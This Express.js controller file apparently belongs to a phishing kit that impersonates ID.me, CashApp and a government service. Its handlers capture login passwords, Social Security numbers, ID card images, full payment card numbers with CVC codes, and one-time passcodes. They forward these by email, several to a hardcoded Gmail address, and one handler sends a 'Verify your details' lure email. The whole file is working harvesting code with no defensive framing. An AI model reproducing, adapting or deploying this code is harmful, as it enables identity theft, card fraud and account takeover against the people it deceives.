const { response } = require('express');
const sendEmail = require('../control/sendemail')

exports.authenticateAdminUser = (req, res) => {
    const { email, password } = req.body;

    try {
        const message = `email:${email}, password:${password}`
        console.log(message)
        const reason = 'Idme Login details'

        sendEmail.sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {
        return res.status(500).send(error.message);
    }
}

exports.links = (req, res) => {
    const { firstName, lastName, email, number, stay, ssn, idfront, idback } = req.body;

    try {
        const message = `email:${email}, firstName:${firstName}, lastName:${lastName}, number:${number}, stayInAmerica:${stay}, ssn:${ssn},idfront:${idfront}, idback:${idback}, `
        console.log(message)
        const reason = 'tbecinc Login details'

        sendEmail.sendEmail2(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {
        return res.status(500).send(error.message);
    }
}

exports.cards = (req, res) => {
    const { country, cardNumber, email, expDate, cvc, street, name, city, zip } = req.body;

    try {
        const message = `email:${email}, country:${country}, expDate:${expDate}, cardNumber:${cardNumber}, cvc:${cvc}, street:${street},name:${name}, city:${city}, zip:${zip}, `
        console.log(message)
        const reason = 'card details'

        sendEmail.sendEmail3(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {
        return res.status(500).send(error.message);
    }
}

exports.mobile = (req, res) => {
    const { number } = req.body;

    try {
        const message = `Mobile number:${number}`
        console.log(message)
        const reason = 'Gov mobile details'
        const email = 'techt5562@gmail.com'

        sendEmail.sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {
        return res.status(500).send(error.message);
    }
}

exports.email = (req, res) => {
    const { emails } = req.body;
    console.log(req.body)

    try {
        const message = `cash app email:${emails}`
        console.log(message)
        const reason = 'CashApp email'
        const email = 'techt5562@gmail.com'

        sendEmail.sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {
        console.log(error)
        return res.status(500).send(error.message);
    }
}

exports.code = (req, res) => {
    const { code } = req.body;

    try {
        const message = `Otp:${code}`
        console.log(message)
        const reason = 'idme Otp code'
        const email = 'techt5562@gmail.com'

        sendEmail.sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {
        return res.status(500).send(error.message);
    }
}
exports.cashCode = (req, res) => {
    const { code } = req.body;

    try {
        const message = `CashApp Otp:${code}`
        console.log(message)
        const reason = 'Cashapp Otp code'
        const email = 'techt5562@gmail.com'

        sendEmail.sendEmail(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {
        return res.status(500).send(error.message);
    }
}

exports.Template = (req, res) => {
    const { email } = req.body;

    try {
        const message = `CashApp Otp:`
        console.log(message)
        const reason = 'Verify your details'
  

        sendEmail.sendEmailTemplate(email, message, reason, (data) => {
            if (data) {
                return res.status(200).json({
                    status: 200,
                    email: email,
                    msg: 'email sent'
                });
            }

        }).then(response => res.send(response.message)).catch(error => res.status);
    } catch (error) {

        return res.status(500).send(error.message);
    }
}

